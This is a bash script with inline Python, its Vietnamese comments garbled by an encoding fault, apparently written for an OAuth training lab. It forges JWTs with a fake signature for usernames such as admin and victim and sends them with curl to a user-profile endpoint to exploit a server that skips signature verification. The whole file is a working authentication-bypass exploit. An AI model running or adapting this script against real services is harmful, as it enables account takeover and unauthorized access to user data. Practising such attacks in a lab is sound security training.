#!/bin/bash

# Lab04 JWT Exploit v·ªõi curl
# L·ªó h·ªïng: Server s·ª≠ d·ª•ng jwt.ParseInsecure() kh√¥ng verify signature

echo "=================================================="
echo "Lab04 JWT Signature Bypass Exploit (curl version)"
echo "=================================================="

# Client ID th·ª±c t·∫ø t·ª´ config
CLIENT_ID="f20e7e23-0376-4c18-9e05-1f862264a288"
SERVER_URL="https://server-04.oauth.labs"

# Function t·∫°o JWT v·ªõi python inline
create_jwt() {
    local username=$1
    python3 -c "
import json
import base64
import time

username = '$username'
client_id = '$CLIENT_ID'

# Header
header = {'alg': 'RS256', 'typ': 'JWT'}

# Payload
now = int(time.time())
payload = {
    'iss': 'https://server-04.oauth.labs',
    'sub': username,
    'aud': [client_id],
    'exp': now + 3600,
    'iat': now,
    'jti': 'exploit-jti',
    'scope': 'read:profile',
    'client_id': client_id
}

# Encode
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

print(f'{header_b64}.{payload_b64}.fake_signature')
"
}

# Function test exploit
test_exploit() {
    local username=$1
    echo ""
    echo "Testing exploit for user: $username"
    echo "----------------------------------------"
    
    # T·∫°o JWT malicious
    jwt_token=$(create_jwt "$username")
    echo "Created JWT: ${jwt_token:0:60}..."
    
    # G·ª≠i request v·ªõi curl
    echo "Sending request to $SERVER_URL/api/users/me"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}" \
        -H "Authorization: Bearer $jwt_token" \
        -H "Content-Type: application/json" \
        -k \
        "$SERVER_URL/api/users/me")
    
    # Parse response
    http_body=$(echo "$response" | head -n -1)
    http_status=$(echo "$response" | tail -n 1 | cut -d: -f2)
    
    echo "HTTP Status: $http_status"
    
    if [ "$http_status" = "200" ]; then
        echo "üéâ EXPLOIT SUCCESS!"
        echo "User data: $http_body"
        return 0
    elif [ "$http_status" = "401" ]; then
        echo "‚ùå Unauthorized - JWT rejected"
        echo "Response: $http_body"
    elif [ "$http_status" = "404" ]; then
        echo "‚ÑπÔ∏è  User '$username' not found in database"
    else
        echo "‚ùå Unexpected status: $http_status"
        echo "Response: $http_body"
    fi
    
    return 1
}

# Test v·ªõi multiple usernames
usernames=("admin" "alice" "bob" "user1" "test" "demo" "victim")
success_count=0

for username in "${usernames[@]}"; do
    if test_exploit "$username"; then
        ((success_count++))
    fi
done

echo ""
echo "=================================================="
echo "SUMMARY: Exploit successful for $success_count users"
echo "=================================================="

if [ $success_count -gt 0 ]; then
    echo "‚úÖ JWT signature bypass vulnerability CONFIRMED!"
    echo "üí• Impact: Complete authentication bypass"
else
    echo "‚ÑπÔ∏è  No users found or server not accessible"
    echo "üîß Debug: Verify lab04 is running and users exist"
fi 